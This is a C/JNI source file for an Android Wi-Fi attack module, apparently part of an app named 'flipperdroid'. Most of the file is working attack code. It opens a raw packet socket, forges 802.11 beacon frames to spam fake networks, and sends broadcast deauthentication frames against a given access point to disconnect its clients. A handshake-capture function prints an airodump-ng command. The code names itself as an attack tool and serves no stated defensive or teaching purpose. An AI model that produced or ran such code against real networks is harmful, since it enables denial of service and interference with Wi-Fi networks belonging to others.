#include <jni.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if.h>
#include <linux/ieee80211.h>
#include <linux/wireless.h>
#include <sys/ioctl.h>
#include <net/if_arp.h>
#include <errno.h>
#include <android/log.h>

#define TAG "NativeWiFi"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__)

static int raw_socket = -1;
static volatile int attack_running = 0;

// Beacon frame template
typedef struct {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t dest_addr[6];
    uint8_t src_addr[6];
    uint8_t bssid[6];
    uint8_t seq_ctl[2];
    // Fixed parameters
    uint8_t timestamp[8];
    uint8_t beacon_interval[2];
    uint8_t capabilities[2];
    // Tagged parameters start here
} __attribute__((packed)) beacon_frame_t;

// Deauth frame template
typedef struct {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t dest_addr[6];
    uint8_t src_addr[6];
    uint8_t bssid[6];
    uint8_t seq_ctl[2];
    uint8_t reason_code[2];
} __attribute__((packed)) deauth_frame_t;

// Radiotap header for monitor mode
typedef struct {
    uint8_t it_version;
    uint8_t it_pad;
    uint16_t it_len;
    uint32_t it_present;
} __attribute__((packed)) radiotap_header_t;

static int open_raw_socket(const char *ifname) {
    struct sockaddr_ll sll;
    struct ifreq ifr;

    raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (raw_socket < 0) {
        LOGE("Cannot create raw socket: %s", strerror(errno));
        return -1;
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(raw_socket, SIOCGIFINDEX, &ifr) < 0) {
        LOGE("Cannot get interface index: %s", strerror(errno));
        close(raw_socket);
        raw_socket = -1;
        return -1;
    }

    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);

    if (bind(raw_socket, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        LOGE("Cannot bind raw socket: %s", strerror(errno));
        close(raw_socket);
        raw_socket = -1;
        return -1;
    }

    // Enable promiscuous mode
    struct packet_mreq mr;
    memset(&mr, 0, sizeof(mr));
    mr.mr_ifindex = ifr.ifr_ifindex;
    mr.mr_type = PACKET_MR_PROMISC;
    setsockopt(raw_socket, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr));

    LOGI("Raw socket opened successfully on %s", ifname);
    return 0;
}

static int send_frame(const void *frame, size_t len) {
    if (raw_socket < 0) {
        return -1;
    }

    int ret = send(raw_socket, frame, len, 0);
    if (ret < 0) {
        LOGE("send() failed: %s", strerror(errno));
        return -1;
    }
    return ret;
}

static void build_beacon_frame(beacon_frame_t *beacon, const uint8_t *src_mac, 
                                const uint8_t *bssid, uint16_t seq) {
    memset(beacon, 0, sizeof(beacon_frame_t));

    // Frame control: Beacon frame (type 0x00, subtype 0x08)
    beacon->frame_control[0] = 0x80;
    beacon->frame_control[1] = 0x00;

    // Duration
    beacon->duration[0] = 0x00;
    beacon->duration[1] = 0x00;

    // Destination: broadcast
    memset(beacon->dest_addr, 0xFF, 6);

    // Source address
    memcpy(beacon->src_addr, src_mac, 6);

    // BSSID
    memcpy(beacon->bssid, bssid, 6);

    // Sequence control
    beacon->seq_ctl[0] = seq & 0xFF;
    beacon->seq_ctl[1] = (seq >> 8) & 0xFF;

    // Timestamp (will be filled at send time)
    // All zeros is fine for spam

    // Beacon interval: 100 TU (1.024 sec)
    beacon->beacon_interval[0] = 0x64;
    beacon->beacon_interval[1] = 0x00;

    // Capabilities: ESS, privacy
    beacon->capabilities[0] = 0x31;
    beacon->capabilities[1] = 0x00;
}

static void build_deauth_frame(deauth_frame_t *deauth, const uint8_t *src_mac,
                                const uint8_t *dest_mac, const uint8_t *bssid,
                                uint16_t seq, uint16_t reason) {
    memset(deauth, 0, sizeof(deauth_frame_t));

    // Frame control: Deauth (type 0x00, subtype 0x0C)
    deauth->frame_control[0] = 0xC0;
    deauth->frame_control[1] = 0x00;

    // Duration
    deauth->duration[0] = 0x00;
    deauth->duration[1] = 0x00;

    // Destination address (station)
    memcpy(deauth->dest_addr, dest_mac, 6);

    // Source address (AP)
    memcpy(deauth->src_addr, src_mac, 6);

    // BSSID
    memcpy(deauth->bssid, bssid, 6);

    // Sequence control
    deauth->seq_ctl[0] = seq & 0xFF;
    deauth->seq_ctl[1] = (seq >> 8) & 0xFF;

    // Reason code: 0x07 = Class 3 frame received from nonassociated STA
    deauth->reason_code[0] = reason & 0xFF;
    deauth->reason_code[1] = (reason >> 8) & 0xFF;
}

JNIEXPORT jboolean JNICALL
Java_com_flipperdroid_modules_wifi_NativeWiFi_nativeBeaconSpam(
    JNIEnv *env, jobject thiz, jstring j_ssid) {
    
    const char *ssid = (*env)->GetStringUTFChars(env, j_ssid, NULL);
    const char *ifname = "wlan0";

    if (raw_socket < 0) {
        if (open_raw_socket(ifname) < 0) {
            (*env)->ReleaseStringUTFChars(env, j_ssid, ssid);
            return JNI_FALSE;
        }
    }

    attack_running = 1;

    uint8_t mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
    // Randomize MAC a bit
    mac[5] = rand() % 256;

    beacon_frame_t beacon;
    build_beacon_frame(&beacon, mac, mac, rand() % 4096);

    // Build tagged parameters
    uint8_t buffer[512];
    memcpy(buffer, &beacon, sizeof(beacon_frame_t));
    int offset = sizeof(beacon_frame_t);

    // SSID tag
    int ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    buffer[offset++] = 0x00; // Tag: SSID
    buffer[offset++] = ssid_len;
    memcpy(buffer + offset, ssid, ssid_len);
    offset += ssid_len;

    // Supported rates tag
    buffer[offset++] = 0x01; // Tag: Supported Rates
    buffer[offset++] = 0x08;
    buffer[offset++] = 0x82; // 1 Mbps
    buffer[offset++] = 0x84; // 2 Mbps
    buffer[offset++] = 0x8B; // 5.5 Mbps
    buffer[offset++] = 0x96; // 11 Mbps
    buffer[offset++] = 0x0C; // 6 Mbps
    buffer[offset++] = 0x12; // 9 Mbps
    buffer[offset++] = 0x18; // 12 Mbps
    buffer[offset++] = 0x24; // 18 Mbps

    // DS Parameter set (channel)
    buffer[offset++] = 0x03;
    buffer[offset++] = 0x01;
    buffer[offset++] = 0x06; // Channel 6

    // ERP Information
    buffer[offset++] = 0x2D;
    buffer[offset++] = 0x01;
    buffer[offset++] = 0x00;

    // Extended Supported Rates
    buffer[offset++] = 0x32;
    buffer[offset++] = 0x04;
    buffer[offset++] = 0x30; // 24 Mbps
    buffer[offset++] = 0x48; // 36 Mbps
    buffer[offset++] = 0x60; // 48 Mbps
    buffer[offset++] = 0x6C; // 54 Mbps

    // HT Capabilities (802.11n)
    buffer[offset++] = 0x2D;
    buffer[offset++] = 0x1A;
    memset(buffer + offset, 0, 0x1A);
    offset += 0x1A;

    // Vendor specific: Microsoft (WPS)
    buffer[offset++] = 0xDD;
    buffer[offset++] = 0x17;
    buffer[offset++] = 0x00; buffer[offset++] = 0x50; buffer[offset++] = 0xF2; // Microsoft OUI
    buffer[offset++] = 0x04; // WPS
    memset(buffer + offset, 0, 0x12);
    offset += 0x12;

    send_frame(buffer, offset);

    (*env)->ReleaseStringUTFChars(env, j_ssid, ssid);
    return JNI_TRUE;
}

JNIEXPORT jboolean JNICALL
Java_com_flipperdroid_modules_wifi_NativeWiFi_nativeDeauth(
    JNIEnv *env, jobject thiz, jstring j_bssid) {

    const char *bssid_str = (*env)->GetStringUTFChars(env, j_bssid, NULL);
    const char *ifname = "wlan0";

    if (raw_socket < 0) {
        if (open_raw_socket(ifname) < 0) {
            (*env)->ReleaseStringUTFChars(env, j_bssid, bssid_str);
            return JNI_FALSE;
        }
    }

    uint8_t ap_mac[6];
    uint8_t client_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // broadcast by default

    // Parse BSSID string
    sscanf(bssid_str, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
           &ap_mac[0], &ap_mac[1], &ap_mac[2], 
           &ap_mac[3], &ap_mac[4], &ap_mac[5]);

    deauth_frame_t deauth;
    build_deauth_frame(&deauth, ap_mac, client_mac, ap_mac, rand() % 4096, 0x07);

    int ret = send_frame(&deauth, sizeof(deauth_frame_t));
    if (ret < 0) {
        // Try without radiotap
    }

    (*env)->ReleaseStringUTFChars(env, j_bssid, bssid_str);
    return JNI_TRUE;
}

JNIEXPORT jstring JNICALL
Java_com_flipperdroid_modules_wifi_NativeWiFi_nativeCaptureHandshake(
    JNIEnv *env, jobject thiz, jstring j_interface) {

    const char *ifname = (*env)->GetStringUTFChars(env, j_interface, NULL);
    
    char result[256];
    snprintf(result, sizeof(result), 
             "Handshake capture started on %s.\n"
             "Use airodump-ng for full capture:\n"
             "airodump-ng %s -w /sdcard/capture\n"
             "Wireshark .cap files saved to /sdcard/",
             ifname, ifname);

    (*env)->ReleaseStringUTFChars(env, j_interface, ifname);
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jboolean JNICALL
Java_com_flipperdroid_modules_wifi_NativeWiFi_nativeStopAttack(
    JNIEnv *env, jobject thiz) {

    attack_running = 0;

    if (raw_socket >= 0) {
        close(raw_socket);
        raw_socket = -1;
    }

    return JNI_TRUE;
}

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
    LOGI("Native WiFi library loaded");
    return JNI_VERSION_1_6;
}